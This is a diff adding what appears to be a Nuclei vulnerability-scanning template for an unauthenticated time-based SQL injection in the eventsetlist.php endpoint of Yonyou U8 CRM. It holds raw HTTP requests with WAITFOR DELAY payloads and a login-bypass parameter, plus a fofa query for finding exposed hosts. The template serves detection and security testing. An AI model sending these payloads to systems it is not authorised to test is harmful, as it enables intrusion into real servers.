@@ -1,0 +1,33 @@
+id: yongyouU8-CRM-eventsetlist_php-sql-time
+
+info:
+  name: "用友 U8 CRM eventsetlist.php接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: title="用友U8CRM"
+      用友U8 CRM客户关系管理系统中eventsetlist.php接口存在SQL注入漏洞。远程攻击者可通过构造恶意SQL查询利用该接口，继而通过扩展存储过程执行系统命令，实现服务器端代码执行及权限获取。该漏洞无需身份验证即可触发，攻击链包含后门文件写入与任意代码执行阶段。
+  reference:
+  - https://mp.weixin.qq.com/s/ZqqKsovbdnR_EpH9EO02_g
+  tags: 用友U8
+
+
+http:
+- raw:
+  - |
+    GET /eventset/eventsetlist.php?DontCheckLogin=1&action=stop&stopFlag=1&eventID=1;WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
+    Cookie: PHPSESSID=bgsesstimeout-;
+
+  - |
+    GET /eventset/eventsetlist.php?DontCheckLogin=1&action=stop&stopFlag=1&eventID=1;WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
+    Cookie: PHPSESSID=bgsesstimeout-
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
